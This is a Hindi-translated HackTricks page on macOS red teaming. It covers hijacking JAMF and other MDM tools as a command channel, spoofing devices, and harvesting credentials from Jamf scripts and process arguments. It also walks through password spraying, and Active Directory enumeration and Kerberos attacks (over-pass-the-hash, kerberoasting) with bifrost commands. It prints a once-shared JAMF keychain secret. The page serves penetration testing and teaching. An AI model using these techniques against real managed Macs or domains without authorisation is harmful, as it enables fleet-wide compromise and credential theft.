# macOS Red Teaming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**अपने वेब ऐप्स, नेटवर्क और क्लाउड पर एक हैकर का दृष्टिकोण प्राप्त करें**

**महत्वपूर्ण, शोषण योग्य कमजोरियों को खोजें और रिपोर्ट करें जिनका वास्तविक व्यापार पर प्रभाव है।** हमारे 20+ कस्टम टूल का उपयोग करें ताकि हमले की सतह का मानचित्रण कर सकें, सुरक्षा मुद्दों को खोज सकें जो आपको विशेषाधिकार बढ़ाने की अनुमति देते हैं, और आवश्यक सबूत इकट्ठा करने के लिए स्वचालित शोषण का उपयोग करें, जिससे आपका कठिन काम प्रभावशाली रिपोर्टों में बदल जाए।

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## MDM का दुरुपयोग करना

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

यदि आप प्रबंधन प्लेटफ़ॉर्म तक पहुँचने के लिए **व्यवस्थापक क्रेडेंशियल्स से समझौता करने** में सफल होते हैं, तो आप **संभावित रूप से सभी कंप्यूटरों से समझौता कर सकते हैं** अपने मैलवेयर को मशीनों में वितरित करके।

MacOS वातावरण में रेड टीमिंग के लिए MDMs के काम करने के तरीके की कुछ समझ होना अत्यधिक अनुशंसित है:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### C2 के रूप में MDM का उपयोग करना

एक MDM को प्रोफाइल स्थापित करने, क्वेरी करने या हटाने, अनुप्रयोग स्थापित करने, स्थानीय व्यवस्थापक खाते बनाने, फर्मवेयर पासवर्ड सेट करने, FileVault कुंजी बदलने की अनुमति होगी...

अपने स्वयं के MDM को चलाने के लिए आपको **अपने CSR को एक विक्रेता द्वारा हस्ताक्षरित** कराना होगा जिसे आप [**https://mdmcert.download/**](https://mdmcert.download/) के साथ प्राप्त करने का प्रयास कर सकते हैं। और Apple उपकरणों के लिए अपने स्वयं के MDM को चलाने के लिए आप [**MicroMDM**](https://github.com/micromdm/micromdm) का उपयोग कर सकते हैं।

हालांकि, एक नामांकित उपकरण में एक अनुप्रयोग स्थापित करने के लिए, आपको अभी भी इसे एक डेवलपर खाते द्वारा हस्ताक्षरित करने की आवश्यकता है... हालाँकि, MDM नामांकन के दौरान **उपकरण MDM के SSL प्रमाणपत्र को एक विश्वसनीय CA के रूप में जोड़ता है**, इसलिए आप अब कुछ भी हस्ताक्षरित कर सकते हैं।

उपकरण को MDM में नामांकित करने के लिए, आपको एक **`mobileconfig`** फ़ाइल को रूट के रूप में स्थापित करना होगा, जिसे एक **pkg** फ़ाइल के माध्यम से वितरित किया जा सकता है (आप इसे ज़िप में संकुचित कर सकते हैं और जब इसे सफारी से डाउनलोड किया जाता है तो यह अनसंकुचित हो जाएगा)।

**Mythic एजेंट Orthrus** इस तकनीक का उपयोग करता है।

### JAMF PRO का दुरुपयोग करना

JAMF **कस्टम स्क्रिप्ट** (सिस्टम प्रशासक द्वारा विकसित स्क्रिप्ट), **स्थानीय पेलोड** (स्थानीय खाता निर्माण, EFI पासवर्ड सेट करना, फ़ाइल/प्रक्रिया निगरानी...) और **MDM** (उपकरण कॉन्फ़िगरेशन, उपकरण प्रमाणपत्र...) चला सकता है।

#### JAMF स्व-संविधान

जांचें कि क्या उनके पास **स्व-संविधान सक्षम** है, इसके लिए `https://<company-name>.jamfcloud.com/enroll/` जैसे पृष्ठ पर जाएं। यदि उनके पास है, तो यह **पहुँच के लिए क्रेडेंशियल्स** मांग सकता है।

आप पासवर्ड स्प्रेइंग हमले को करने के लिए स्क्रिप्ट [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) का उपयोग कर सकते हैं।

इसके अलावा, उचित क्रेडेंशियल्स खोजने के बाद, आप अगले फॉर्म के साथ अन्य उपयोगकर्ता नामों को ब्रूट-फोर्स करने में सक्षम हो सकते हैं:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF उपकरण प्रमाणीकरण

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** बाइनरी में कीचेन को खोलने का रहस्य था जो खोज के समय सभी के बीच **साझा** था और यह था: **`jk23ucnq91jfu9aj`**।\
इसके अलावा, jamf **`/Library/LaunchAgents/com.jamf.management.agent.plist`** में **LaunchDaemon** के रूप में **स्थायी** रहता है।

#### JAMF उपकरण अधिग्रहण

**JSS** (Jamf सॉफ़्टवेयर सर्वर) **URL** जो **`jamf`** उपयोग करेगा, वह **`/Library/Preferences/com.jamfsoftware.jamf.plist`** में स्थित है।\
यह फ़ाइल मूल रूप से URL को शामिल करती है:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

तो, एक हमलावर एक दुर्भावनापूर्ण पैकेज (`pkg`) छोड़ सकता है जो स्थापित होने पर **इस फ़ाइल को अधिलेखित करता है** और **URL को एक Mythic C2 श्रोता से Typhon एजेंट** के रूप में सेट करता है ताकि अब JAMF का दुरुपयोग C2 के रूप में किया जा सके।

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF धोखाधड़ी

एक डिवाइस और JMF के बीच **धोखाधड़ी करने के लिए** आपको आवश्यकता है:

* डिवाइस का **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* **JAMF कीचेन**: `/Library/Application\ Support/Jamf/JAMF.keychain` जिसमें डिवाइस प्रमाणपत्र होता है

इस जानकारी के साथ, **एक VM बनाएं** जिसमें **चुराया हुआ** हार्डवेयर **UUID** हो और **SIP अक्षम** हो, **JAMF कीचेन** डालें, Jamf **एजेंट** को **हुक** करें और इसकी जानकारी चुराएं।

#### रहस्यों की चोरी

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

आप `/Library/Application Support/Jamf/tmp/` स्थान की निगरानी भी कर सकते हैं जहाँ **कस्टम स्क्रिप्ट** हो सकती हैं जिन्हें व्यवस्थापक Jamf के माध्यम से निष्पादित करना चाहते हैं क्योंकि ये **यहाँ रखी जाती हैं, निष्पादित की जाती हैं और हटा दी जाती हैं**। ये स्क्रिप्ट **प्रमाण पत्र** हो सकते हैं।

हालांकि, **प्रमाण पत्र** इन स्क्रिप्टों में **पैरामीटर** के रूप में पास किए जा सकते हैं, इसलिए आपको `ps aux | grep -i jamf` की निगरानी करने की आवश्यकता होगी (बिना रूट बने)।

स्क्रिप्ट [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) नए फ़ाइलों को जोड़े जाने और नए प्रक्रिया तर्कों के लिए सुन सकती है।

### macOS दूरस्थ पहुंच

और **MacOS** "विशेष" **नेटवर्क** **प्रोटोकॉल** के बारे में:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## सक्रिय निर्देशिका

कुछ अवसरों पर आप पाएंगे कि **MacOS कंप्यूटर एक AD से जुड़ा हुआ है**। इस परिदृश्य में आपको सक्रिय निर्देशिका को **गणना** करने का प्रयास करना चाहिए जैसा कि आप इसके लिए उपयोग करते हैं। निम्नलिखित पृष्ठों में कुछ **सहायता** प्राप्त करें:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

कुछ **स्थानीय MacOS उपकरण** जो आपकी मदद कर सकते हैं वह है `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
इसके अलावा, MacOS के लिए कुछ उपकरण तैयार किए गए हैं जो स्वचालित रूप से AD को सूचीबद्ध करते हैं और kerberos के साथ काम करते हैं:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound एक Bloodhound ऑडिटिंग उपकरण का विस्तार है जो MacOS होस्ट पर Active Directory संबंधों को एकत्रित और ग्रहण करने की अनुमति देता है।
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost एक Objective-C प्रोजेक्ट है जिसे macOS पर Heimdal krb5 APIs के साथ इंटरैक्ट करने के लिए डिज़ाइन किया गया है। इस प्रोजेक्ट का लक्ष्य macOS उपकरणों पर Kerberos के चारों ओर बेहतर सुरक्षा परीक्षण सक्षम करना है, जो कि किसी अन्य ढांचे या पैकेज की आवश्यकता के बिना मूल APIs का उपयोग करता है।
* [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory सूचीकरण करने के लिए Automation (JXA) के लिए JavaScript उपकरण।

### डोमेन जानकारी
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

MacOS उपयोगकर्ताओं के तीन प्रकार हैं:

* **स्थानीय उपयोगकर्ता** — स्थानीय OpenDirectory सेवा द्वारा प्रबंधित, वे किसी भी तरह से Active Directory से जुड़े नहीं हैं।
* **नेटवर्क उपयोगकर्ता** — अस्थायी Active Directory उपयोगकर्ता जिन्हें प्रमाणीकरण के लिए DC सर्वर से कनेक्शन की आवश्यकता होती है।
* **मोबाइल उपयोगकर्ता** — Active Directory उपयोगकर्ता जिनके पास उनके क्रेडेंशियल्स और फ़ाइलों का स्थानीय बैकअप होता है।

उपयोगकर्ताओं और समूहों के बारे में स्थानीय जानकारी फ़ोल्डर _/var/db/dslocal/nodes/Default._ में संग्रहीत होती है।\
उदाहरण के लिए, _mark_ नाम के उपयोगकर्ता की जानकारी _/var/db/dslocal/nodes/Default/users/mark.plist_ में संग्रहीत होती है और समूह _admin_ की जानकारी _/var/db/dslocal/nodes/Default/groups/admin.plist_ में होती है।

HasSession और AdminTo किनारों का उपयोग करने के अलावा, **MacHound Bloodhound डेटाबेस में तीन नए किनारे जोड़ता है**:

* **CanSSH** - इकाई जिसे होस्ट पर SSH करने की अनुमति है
* **CanVNC** - इकाई जिसे होस्ट पर VNC करने की अनुमति है
* **CanAE** - इकाई जिसे होस्ट पर AppleEvent स्क्रिप्ट निष्पादित करने की अनुमति है
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
अधिक जानकारी के लिए [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ पासवर्ड

पासवर्ड प्राप्त करने के लिए:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
यह **`Computer$`** पासवर्ड को सिस्टम कीचेन के अंदर एक्सेस करना संभव है।

### ओवर-पास-दी-हैश

एक विशिष्ट उपयोगकर्ता और सेवा के लिए TGT प्राप्त करें:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
एक बार TGT इकट्ठा हो जाने के बाद, इसे वर्तमान सत्र में इंजेक्ट करना संभव है:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### केर्बेरॉस्टिंग
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
प्राप्त सेवा टिकटों के साथ अन्य कंप्यूटरों में शेयरों तक पहुँचने की कोशिश करना संभव है:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychain तक पहुँच

Keychain में संवेदनशील जानकारी हो सकती है जो यदि बिना प्रॉम्प्ट उत्पन्न किए पहुँचाई जाए तो एक रेड टीम अभ्यास को आगे बढ़ाने में मदद कर सकती है:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## बाहरी सेवाएँ

MacOS रेड टीमिंग सामान्य Windows रेड टीमिंग से अलग है क्योंकि आमतौर पर **MacOS कई बाहरी प्लेटफार्मों के साथ सीधे एकीकृत होता है**। MacOS की एक सामान्य कॉन्फ़िगरेशन है **OneLogin समन्वयित क्रेडेंशियल्स का उपयोग करके कंप्यूटर तक पहुँच प्राप्त करना, और OneLogin के माध्यम से कई बाहरी सेवाओं (जैसे github, aws...) तक पहुँच प्राप्त करना**।

## विविध रेड टीम तकनीकें

### सफारी

जब सफारी में एक फ़ाइल डाउनलोड की जाती है, यदि यह एक "सुरक्षित" फ़ाइल है, तो यह **स्वतः खोली जाएगी**। तो उदाहरण के लिए, यदि आप **एक ज़िप डाउनलोड करते हैं**, तो यह स्वचालित रूप से अनज़िप हो जाएगी:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## संदर्भ

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**अपने वेब ऐप्स, नेटवर्क, और क्लाउड पर एक हैकर का दृष्टिकोण प्राप्त करें**

**महत्वपूर्ण, शोषण योग्य कमजोरियों को खोजें और रिपोर्ट करें जिनका वास्तविक व्यापार पर प्रभाव है।** हमारे 20+ कस्टम टूल का उपयोग करके हमले की सतह का मानचित्रण करें, सुरक्षा मुद्दों को खोजें जो आपको विशेषाधिकार बढ़ाने की अनुमति देते हैं, और आवश्यक सबूत इकट्ठा करने के लिए स्वचालित शोषण का उपयोग करें, जिससे आपका कठिन काम प्रभावशाली रिपोर्टों में बदल जाए।

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
